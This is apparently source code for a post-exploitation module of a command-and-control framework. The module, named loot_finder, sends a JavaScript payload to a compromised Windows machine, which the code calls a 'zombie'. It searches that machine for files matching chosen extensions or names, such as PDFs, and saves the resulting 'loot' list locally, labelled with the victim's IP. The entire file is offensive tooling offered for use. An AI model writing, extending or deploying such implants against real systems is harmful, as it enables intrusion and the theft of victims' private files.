import core.implant
import uuid

class LootFinderJob(core.job.Job):
    def create(self):
        if self.session_id == -1:
            if not self.options.get("LOOTEXTS") and not self.options.get("LOOTFILES"):
                self.shell.print_error("Need to define extensions or files to look for!")
                return False

        if self.options.get("LOOTEXTS"):
            extension_list = "".join(self.options.get("LOOTEXTS").split()).split(",")
            self.options.set("LOOTE", " ".join(["\\\\"+x+"$" for x in extension_list]))

        if self.options.get("LOOTFILES"):
            files_list = "".join(self.options.get("LOOTFILES").replace(".", "\\\\.").split()).split(",")
            self.options.set("LOOTF", " ".join(["."+x+".*" for x in files_list]))

        if self.options.get("LOOTDIR")[-1] != "\\":
            self.options.set("LOOTDIR", self.options.get("LOOTDIR")+"\\")

        self.options.set("LOOTD", self.options.get("LOOTDIR").replace("\\", "\\\\"))
        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))

    def done(self):
        self.results = self.data
        self.display()

    def display(self):
        self.shell.print_good("Loot findings:")
        if len(self.data.splitlines()) > 10:
            self.shell.print_warning("Lots of loot! Only printing first 10 lines...")
            self.shell.print_plain("\n".join(self.data.splitlines()[:10]))
        else:
            self.shell.print_plain(self.data)

        save_file = "/tmp/loot."+self.session.ip+"."+uuid.uuid4().hex
        with open(save_file, "w") as f:
            f.write(self.data)

        self.shell.print_good("Saved loot list to "+save_file)

class LootFinderImplant(core.implant.Implant):

    NAME = "Find loot on the target box"
    DESCRIPTION = "Finds loot on the target box"
    AUTHORS = ["TheNaterz"]
    STATE = "implant/gather/loot_finder"

    def load(self):
        self.options.register("DIRECTORY", "%TEMP%", "writeable directory on zombie", required=False)
        self.options.register("LOOTDIR", "C:\\", "root directory to search for loot", required=True)
        self.options.register("LOOTEXTS", ".pdf, .xsl", "file extensions to search for (comma seperated)", required=False)
        self.options.register("LOOTFILES", "", "files or words to search for (comma seperated)", required=False)
        self.options.register("LOOTE", "", "string to send to zombie", hidden=True)
        self.options.register("LOOTD", "", "string to send to zombie", hidden=True)
        self.options.register("LOOTF", "", "string to send to zombie", hidden=True)

    def job(self):
        return LootFinderJob

    def run(self):
        if not self.options.get("LOOTEXTS") and not self.options.get("LOOTFILES"):
            self.shell.print_error("Need to define extensions or files to look for!")
            return

        payloads = {}
        payloads["js"] = "data/implant/gather/loot_finder.js"

        self.dispatch(payloads, self.job)
